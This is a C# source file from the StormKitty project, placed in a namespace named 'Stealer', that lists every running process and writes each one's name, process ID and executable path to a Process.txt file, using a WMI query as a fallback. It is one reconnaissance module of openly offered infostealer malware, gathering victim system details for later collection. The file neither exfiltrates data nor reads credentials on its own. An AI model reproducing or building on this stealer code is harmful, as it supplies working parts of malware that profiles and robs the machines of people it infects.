/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.IO;
using System.Diagnostics;
using System.Management;

namespace Stealer
{
    internal sealed class ProcessList
    {
        // Save process list
        public static void WriteProcesses(string sSavePath)
        {
            foreach (Process process in Process.GetProcesses())
            {
                File.AppendAllText (
                    sSavePath + "\\Process.txt",
                    "NAME: " + process.ProcessName +
                    "\n\tPID: " + process.Id +
                    "\n\tEXE: " + ProcessExecutablePath(process) +
                    "\n\n"
                    );
            }
        }

        // Get process executable path
        public static string ProcessExecutablePath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch
            {
                string query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

                foreach (ManagementObject item in searcher.Get())
                {
                    object id = item["ProcessID"];
                    object path = item["ExecutablePath"];

                    if (path != null && id.ToString() == process.Id.ToString())
                    {
                        return path.ToString();
                    }
                }
            }

            return "";
        }

    }
}
